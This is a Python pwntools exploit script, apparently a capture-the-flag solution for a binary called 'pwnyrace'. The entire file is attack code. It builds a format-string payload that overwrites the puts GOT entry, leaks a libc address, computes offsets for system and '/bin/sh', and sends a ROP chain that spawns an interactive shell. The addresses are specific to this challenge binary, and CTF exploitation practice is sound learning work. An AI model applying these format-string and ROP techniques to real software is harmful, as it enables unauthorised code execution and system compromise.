from pwn import *

if __name__=="__main__":
	p = process('./pwnyrace', env={"LD_PRELOAD" : "./libc.so.6"}, level="debug")
	libc = ELF('./libc.so.6')
	
	gdb.attach(p, gdbscript='b*0x00000000004011dc\nc\n')
	
	puts_got = 0x404018
	
	pop_rdi = 0x0000000000401293
	main = 0x0000000000401196
	pops = 0x401286
	bss = 0x404050
	var = 0x404048
	
	off1 = int('0x' + hex(pops)[-4:], 16)
	off2 = int(hex(pops)[-8:-4], 16)
	
	
	while(off1>off2):
		off2 += 0x100
	pay = '%22$p'
	pay += '%{}p'.format(off1 - 14 - 3)
	pay += 'a'*3
	pay += '%10$hn'
	pay += '%{}p'.format(off2 - off1)
	pay += '%11$hhn'
	pay += p64(puts_got)
	pay += p64(puts_got+2)
	pay += p64(main)
	p.sendline(pay)
	
	#p.recvuntil('/bin/sh')
	leak = p.recv(16)
	info('leak: %s'%leak)

	libc_base = int(leak, 16) - 0x1f0fc8
	one_gadget = libc_base + 0xe6c81
	system = libc_base + 0x55410
	binsh = libc_base + 0x1b75aa

	pay = 'a'*48
	pay += p64(pop_rdi)
	pay += p64(binsh)
	pay += p64(system)
	
	p.sendline(pay)

	p.interactive()
